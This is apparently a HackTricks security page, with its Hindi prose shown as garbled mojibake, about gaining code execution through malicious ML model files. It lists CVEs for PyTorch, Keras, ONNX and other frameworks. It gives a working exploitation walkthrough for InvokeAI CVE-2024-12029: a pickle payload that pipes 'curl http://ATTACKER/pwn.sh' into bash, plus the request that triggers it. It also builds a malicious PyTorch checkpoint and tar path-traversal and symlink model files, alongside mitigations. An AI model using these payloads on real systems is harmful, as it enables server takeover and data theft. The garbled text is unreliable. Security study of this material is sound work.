# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models рдЖрдорддреМрд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рд╛рд░реВрдкреЛрдВ рдореЗрдВ рд╕рд╛рдЭрд╛ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ ONNX, TensorFlow, PyTorch, рдЖрджрд┐ред рдЗрди рдореЙрдбрд▓реЛрдВ рдХреЛ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреА рдорд╢реАрдиреЛрдВ рдпрд╛ рдЙрддреНрдкрд╛рджрди рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдореЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЖрдорддреМрд░ рдкрд░, рдореЙрдбрд▓реЛрдВ рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдореЙрдбрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ рдПрдХ рдЗрдЪреНрдЫрд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ рдореЙрдбрд▓ рд▓реЛрдбрд┐рдВрдЧ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВ рдПрдХ рднреЗрджреНрдпрддрд╛ рдХреЗ рдХрд╛рд░рдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рд▓реЗрдЦрди рдХреЗ рд╕рдордп, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* тАУ **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow тЖТ heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attackerтАЩs `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays тАУ malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelтАЩs external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attackerтАЩs native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 тАж 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesnтАЩt cover old format тАУ тАЬdowngrade attackтАЭ) | |
| **Others** (general)        | *Design flaw* тАУ Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ рдкрд╛рдпрдерди рдкрд┐рдХрд▓ рдЖрдзрд╛рд░рд┐рдд рдореЙрдбрд▓ рдЬреИрд╕реЗ рдХрд┐ [PyTorch](https://github.com/pytorch/pytorch/security) рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ, рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЙрдиреНрд╣реЗрдВ `weights_only=True` рдХреЗ рд╕рд╛рде рд▓реЛрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ред рдЗрд╕рд▓рд┐рдП, рдХреЛрдИ рднреА рдкрд┐рдХрд▓ рдЖрдзрд╛рд░рд┐рдд рдореЙрдбрд▓ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЛрдВ рдХреЗ рдкреНрд░рддрд┐ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рднрд▓реЗ рд╣реА рд╡реЗ рдКрдкрд░ рдХреА рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рди рд╣реЛрдВред

### ЁЯЖХ  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` Stable-Diffusion рдХреЗ рд▓рд┐рдП рдПрдХ рд▓реЛрдХрдкреНрд░рд┐рдп рдУрдкрди-рд╕реЛрд░реНрд╕ рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рд╣реИред рд╕рдВрд╕реНрдХрд░рдг **5.3.1 тАУ 5.4.2** REST рдПрдВрдбрдкреЙрдЗрдВрдЯ `/api/v2/models/install` рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдордирдорд╛рдиреЗ URLs рд╕реЗ рдореЙрдбрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ, рдПрдВрдбрдкреЙрдЗрдВрдЯ рдЕрдВрддрддрдГ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
рдЬрдм рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдПрдХ **PyTorch checkpoint (`*.ckpt`)** рд╣реИ, рддреЛ `torch.load` **pickle deserialization** рдХрд░рддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рд╕рд╛рдордЧреНрд░реА рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдирд┐рдпрдВрддреНрд░рд┐рдд URL рд╕реЗ рдЖрддреА рд╣реИ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЪреЗрдХрдкреЙрдЗрдВрдЯ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХрд╕реНрдЯрдо `__reduce__` рд╡рд┐рдзрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдСрдмреНрдЬреЗрдХреНрдЯ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ; рдпрд╣ рд╡рд┐рдзрд┐ **deserialization** рдХреЗ рджреМрд░рд╛рди рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ **remote code execution (RCE)** InvokeAI рд╕рд░реНрд╡рд░ рдкрд░ рд╣реЛрддреА рд╣реИред

рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЛ **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) рд╕реМрдВрдкрд╛ рдЧрдпрд╛ рдерд╛ред

#### рд╢реЛрд╖рдг рд╡реЙрдХ-рдереНрд░реВ

1. рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЪреЗрдХрдкреЙрдЗрдВрдЯ рдмрдирд╛рдПрдВ:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` рдХреЛ рдПрдХ HTTP рд╕рд░реНрд╡рд░ рдкрд░ рд╣реЛрд╕реНрдЯ рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ `http://ATTACKER/payload.ckpt`)ред
3. рдХрдордЬреЛрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ (рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false тЖТ no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. рдЬрдм InvokeAI рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ `torch.load()` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ тЖТ `os.system` рдЧреИрдЬреЗрдЯ рдЪрд▓рддрд╛ рд╣реИ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ InvokeAI рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

рддреИрдпрд╛рд░-рдирд┐рд░реНрдорд┐рдд рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ: **Metasploit** рдореЙрдбреНрдпреВрд▓ `exploit/linux/http/invokeai_rce_cve_2024_12029` рдкреВрд░реЗ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред

#### рд╢рд░реНрддреЗрдВ

тАв  InvokeAI 5.3.1-5.4.2 (рд╕реНрдХреИрди рдзреНрд╡рдЬ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **false**)
тАв  `/api/v2/models/install` рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪ рдпреЛрдЧреНрдп
тАв  рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╢реЗрд▓ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ

#### рд╢рдорди

* **InvokeAI тЙе 5.4.3** рдореЗрдВ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ тАУ рдкреИрдЪ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `scan=True` рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рдореИрд▓рд╡реЗрдпрд░ рд╕реНрдХреИрдирд┐рдВрдЧ рдХрд░рддрд╛ рд╣реИред
* рдЬрдм рдЪреЗрдХрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ, рддреЛ `torch.load(file, weights_only=True)` рдпрд╛ рдирдП [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) рд╕рд╣рд╛рдпрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
* рдореЙрдбрд▓ рд╕реНрд░реЛрддреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐-рд╕реВрдЪрд┐рдпрд╛рдБ / рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдФрд░ рд╕реЗрд╡рд╛ рдХреЛ рдиреНрдпреВрдирддрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдПрдБред

> тЪая╕П рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ **рдХреЛрдИ рднреА** Python рдкрд┐рдХрд▓-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рд╛рд░реВрдк (рдЬрд┐рд╕рдореЗрдВ рдХрдИ `.pt`, `.pkl`, `.ckpt`, `.pth` рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ) рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рд╛рднрд╛рд╡рд┐рдХ рд░реВрдк рд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИред

---

рдпрджрд┐ рдЖрдкрдХреЛ рдкреБрд░рд╛рдиреЗ InvokeAI рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рд░рд┐рд╡рд░реНрд╕ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдкреАрдЫреЗ рдЪрд▓рд╛рдирд╛ рд╣реИ, рддреЛ рдПрдХ рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рд╢рдорди рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## рдЙрджрд╛рд╣рд░рдг - рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг PyTorch рдореЙрдбрд▓ рдмрдирд╛рдирд╛

- рдореЙрдбрд▓ рдмрдирд╛рдПрдВ:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- рдореЙрдбрд▓ рд▓реЛрдб рдХрд░реЗрдВ:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# тЪая╕П This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) рдореЗрдВ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рд╣реИ, рд╡рд┐рднрд┐рдиреНрди AI рдлреНрд░реЗрдорд╡рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдореЙрдбрд▓ рдлрд╝реЙрд░реНрдореЗрдЯ рдЖрд░реНрдХрд╛рдЗрд╡реНрд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рдЖрдорддреМрд░ рдкрд░ `.zip`ред рдЗрд╕рд▓рд┐рдП, рдЗрди рдлрд╝реЙрд░реНрдореЗрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрде traversal рд╣рдорд▓реЗ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдордирдЪрд╛рд╣реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ рдЬрд╣рд╛рдБ рдореЙрдбрд▓ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде рдЖрдк рдПрдХ рдРрд╕рд╛ рдореЙрдбрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ `/tmp` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдЧрд╛:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
рдпрд╛ рдХреЛрдб рдХреЗ рд╕рд╛рде рдЖрдк рдПрдХ рдореЙрдбрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ `/tmp` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд┐рдореНрд▓рд┐рдВрдХ рдмрдирд╛рдПрдЧрд╛:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## рд╕рдВрджрд░реНрдн

- [OffSec рдмреНрд▓реЙрдЧ тАУ "CVE-2024-12029 тАУ InvokeAI рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЗрдЯрд╛ рдХрд╛ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI рдкреИрдЪ рдХрдорд┐рдЯ 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit рдореЙрдбреНрдпреВрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch тАУ torch.load рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдЪрд╛рд░](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
